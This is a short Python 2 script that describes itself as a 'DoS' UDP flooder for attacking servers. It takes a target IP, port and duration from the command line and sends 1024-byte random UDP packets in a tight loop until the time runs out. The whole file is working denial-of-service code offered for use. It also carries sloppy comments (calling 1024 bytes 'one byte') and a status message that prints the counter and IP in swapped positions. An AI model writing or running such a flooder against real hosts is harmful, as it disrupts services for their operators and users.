"""
UDP Flooder.
This is a 'Dos' attack program to attack servers, you set the IP
and the port and the amount of seconds and it will start flooding to that server.
(inspire from http://hazardedit.com/forum/viewtopic.php?t=73)

Usage : ./flood_udp <ip> <port> <second>
"""
import time
import socket
import random
import sys

def usage():
    print "Usage: " + sys.argv[0] + " <ip> <port> <second>"

def flood(victim, vport, duration):
    # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 1024 representes one byte to the server
    bytes = random._urandom(1024)
    timeout =  time.time() + duration
    sent = 0

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "Attacking %s sent packages %s at the port %s "%(sent, victim, vport)

def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
